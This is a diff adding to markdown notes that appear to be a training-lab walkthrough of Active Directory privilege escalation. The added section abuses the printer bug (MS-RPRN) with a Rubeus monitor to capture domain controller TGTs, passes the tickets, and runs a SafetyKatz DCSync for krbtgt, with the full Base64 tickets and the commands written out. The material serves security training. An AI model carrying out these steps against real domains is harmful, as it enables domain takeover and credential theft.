@@ -1700,6 +1700,7 @@ gwmi -Class win32_operatingsystem -ComputerName dcorp-dc
 
 # **Domain Privilege Escalation**
 
+***
 
 ### **Kerberoast Attack - Crack SQL Server Service Account Password**
 
@@ -1757,7 +1758,7 @@ C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerbero
 
 ![](https://i.imgur.com/VsPwFaB.png)
 
-
+***
 ### **Locate `dcorp` Domain Server with Unconstrained Delegation Enabled.**
 
 
@@ -1799,3 +1800,164 @@ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 
 Find-PSRemotingLocalAdminAccess
 ```
+
+
+
+![](https://i.imgur.com/vsiDSok.png)
+
+
+
+### **Exploit Printer Bug for Escalation to Enterprise Admins Privileges**
+
+
+
+- Run the below command from the new process running `appadmin` -:
+
+```powershell
+echo F | xcopy C:\AD\Tools\Rubeus.exe \\dcorp-appsrv\C$\Users\Public\Rubeus.exe /Y
+```
+
+
+![](https://i.imgur.com/6ZZeoLg.png)
+
+
+- Run `Rubeus` in listener mode
+
+```powershell
+winrs -r:dcorp-appsrv cmd
+
+
+C:\Users\Public\Rubeus.exe monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
+```
+
+
+- Force Authentication from` dcorp-dc$` on Student VM Using MS-RPRN. (make sure to start up a new process on your student machine)
+
+
+```powershell
+C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
+```
+
+
+![](https://i.imgur.com/IKPDwpG.png)
+
+
+- On the `Rubeus` listener, we can see the TGT of `dcorp-dc$` (Output):
+
+
+```
+# Important Output
+# User :
+# Base64EncodedTicket :
+
+
+[*] Monitoring every 5 seconds for new TGTs
+
+
+[*] 12/18/2023 9:34:26 PM UTC - Found new TGT:
+
+  User                  :  DCORP-DC$@DOLLARCORP.MONEYCORP.LOCAL
+  StartTime             :  12/18/2023 5:51:15 AM
+  EndTime               :  12/18/2023 3:51:15 PM
+  RenewTill             :  12/24/2023 8:17:13 PM
+  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+  Base64EncodedTicket   :
+
+    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
+
+[*] Ticket cache size: 1
+```
+
+
+
+![](https://i.imgur.com/xfekzWb.png)
+
+
+
+- Copy the base64 encoded ticket and Use Rubeus with Base64 Encoded Ticket on Student VM for SafetyKatz DCSync Command (Run the below command from an elevated prompt) -:
+
+
+```powershell
+# C:\AD\Tools\Rubeus.exe ptt /ticket:<Base64EncodedTicket>
+# Example -:
+
+
+C:\AD\Tools\Rubeus.exe ptt /ticket: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
+```
+
+
+![](https://i.imgur.com/BT3kcjj.png)
+
+
+
+- Now, we can run `DCSync` from this process:
+
+
+```powershell
+C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
+```
+
+
+### **Escalation to Enterprise Admins**
+
+- To get Enterprise Admin privileges, we need to force authentication from `mcorp-dc`. Run the below command to listen for `mcorp-dc$` tickets on `dcorp-appsrv`:
+
+```powershell
+winrs -r:dcorp-appsrv cmd
+
+C:\Users\Public\Rubeus.exe monitor /targetuser:MCORP-DC$ /interval:5 /nowrap
+```
+
+> **Note -:** Incase you get "access is denied", you are probably running in the wrong shell, so just terminate the `Rubeus` listener we created then and run in that process
+
+
+
+![](https://i.imgur.com/NhLQfn8.png)
+
+
+
+- Use `MS-RPRN` on the student VM to trigger authentication from `mcorp-dc` to `dcorp-appsrv`:
+
+
+```powershell
+C:\AD\Tools\MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
+
+# Expected Output -
+RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1722 - The RPC server is unavailable.
+```
+
+- Now check your `Rubeus` output and you should see the **Base64EncodedTicket**
+- Utilize `Rubeus` with **Base64 Encoded Ticket** on Student VM to Execute Elevated `SafetyKatz` DCSync Command. (Rub below command from elevated shell)
+
+
+```powershell
+# C:\AD\Tools\Rubeus.exe ptt /ticket:<Base64EncodedTicket>
+# Example -:
+
+
+C:\AD\Tools\Rubeus.exe ptt /ticket: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
+```
+
+
+- Now, we can run the DCSync attack from this process:
+
+
+```powershell
+C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
+```
+
+
+**Awesome ! We escalated to Enterprise Admins too! **
+
+***
+
+
+Enumerate users in the domain for whom Constrained Delegation is enabled. − For such a user, request a TGT from the DC and obtain a TGS for the service to which delegation is configured. 
+− Pass the ticket and access the service.
+
+
+>[!caution] Enumerate users in the domain for whom Constrained Delegation is enabled.
+> - For such a user, request a TGT from the DC and obtain a TGS for the service to which delegation is configured.
+> - Pass the ticket and access the service.
+
+
